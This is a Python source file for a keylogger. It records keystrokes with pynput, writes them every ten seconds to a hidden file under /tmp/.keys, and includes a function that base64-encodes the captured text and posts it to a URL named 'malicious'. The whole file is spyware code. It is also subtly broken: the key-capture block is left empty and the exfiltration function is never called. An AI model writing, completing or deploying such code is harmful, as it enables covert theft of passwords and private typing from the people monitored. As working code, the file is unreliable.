from pynput.keyboard import Key, Listener
import requests
import base64
import os
import threading

WEBSITE_URL = "https://malicious/logs"

def send_to_website(data):
    try:
        encoded_data = base64.b64encode(data.encode()).decode()
        response = requests.post(WEBSITE_URL, data={"keystrokes": encoded_data})
        print("Data sent to website. Status code:", response.status_code)
    except Exception as e:
        print("Error sending data to website:", str(e))

def save_to_file(data):
    try:
        directory = os.path.join(os.sep, "tmp", ".keys")
        os.makedirs(directory, exist_ok=True)
        file_path = os.path.join(directory, "log.txt")
        with open(file_path, "a") as file:
            file.write(data)
        print("Data saved to file:", file_path)
    except Exception as e:
        print("Error saving data to file:", str(e))

def on_press(key):
    try:
        # Convert key to string
    except AttributeError:
        key_str = "[" + str(key) + "]"
    
    buffer.append(key_str)

def on_release(key):
    if key == Key.esc:  
        save_to_file("".join(buffer))
        return False

def save_buffer_periodically():
    while True:
        if buffer:
            save_to_file("".join(buffer))
            del buffer[:]
        threading.Timer(10, save_buffer_periodically).start()
        break

buffer = []

listener = Listener(on_press=on_press, on_release=on_release)

listener.start()

save_buffer_periodically()

listener.join()

